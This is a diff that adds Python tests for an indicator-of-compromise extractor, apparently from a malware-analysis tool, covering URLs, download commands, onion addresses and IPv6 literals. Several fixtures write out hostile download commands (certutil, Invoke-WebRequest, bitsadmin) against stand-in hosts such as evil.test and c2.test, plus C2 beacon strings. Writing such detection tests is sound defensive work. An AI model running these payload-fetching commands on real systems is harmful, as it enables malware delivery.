@@ -77,3 +77,56 @@ class TestExtractIocs:
         assert iocs is not None
         assert "10.0.0.1" in iocs["ips"]
         assert any("wget" in d.lower() for d in iocs["downloads"])
+
+    def test_empty_categories_omitted(self):
+        # A lone URL should not carry empty ips/onions/etc. keys.
+        iocs = extract_iocs(b"visit http://only.test/here and nothing else!")
+        assert iocs is not None
+        assert set(iocs) == {"urls"}
+
+    def test_certutil_lolbin_captured(self):
+        data = (b"cmd /c certutil.exe -urlcache -split -f "
+                b"http://evil.test/a.exe a.exe")
+        iocs = extract_iocs(data)
+        assert iocs is not None
+        assert any("certutil" in d.lower() for d in iocs["downloads"])
+        assert any("http://evil.test/a.exe" in u for u in iocs["urls"])
+
+    def test_invoke_webrequest_lolbin_captured(self):
+        data = b"powershell Invoke-WebRequest -Uri http://c2.test/p.ps1 -OutFile p"
+        iocs = extract_iocs(data)
+        assert iocs is not None
+        assert any("invoke-webrequest" in d.lower() for d in iocs["downloads"])
+
+    def test_bitsadmin_lolbin_captured(self):
+        data = b"bitsadmin /transfer job http://c2.test/x http://c2.test/x"
+        iocs = extract_iocs(data)
+        assert iocs is not None
+        assert any("bitsadmin" in d.lower() for d in iocs["downloads"])
+
+    def test_onion_v3_extracted(self):
+        onion = b"a" * 56 + b".onion"
+        data = b"beacon to http://" + onion + b"/path over tor"
+        iocs = extract_iocs(data)
+        assert iocs is not None
+        assert (b"a" * 56 + b".onion").decode() in iocs["onions"]
+
+    def test_onion_v2_extracted(self):
+        onion = b"expyuzz4wqqyqhjn"  # 16 chars
+        data = b"c2 at " + onion + b".onion here"
+        iocs = extract_iocs(data)
+        assert iocs is not None
+        assert "expyuzz4wqqyqhjn.onion" in iocs["onions"]
+
+    def test_ipv6_literal_extracted(self):
+        data = b"connect [2001:db8::1]:4444 for the beacon session now"
+        iocs = extract_iocs(data)
+        assert iocs is not None
+        assert "2001:db8::1" in iocs["ipv6"]
+
+    def test_ipv6_loopback_filtered(self):
+        data = b"bind to ::1 and talk to 2001:db8:cafe::beef somewhere else"
+        iocs = extract_iocs(data)
+        assert iocs is not None
+        assert "::1" not in iocs.get("ipv6", [])
+        assert "2001:db8:cafe::beef" in iocs["ipv6"]
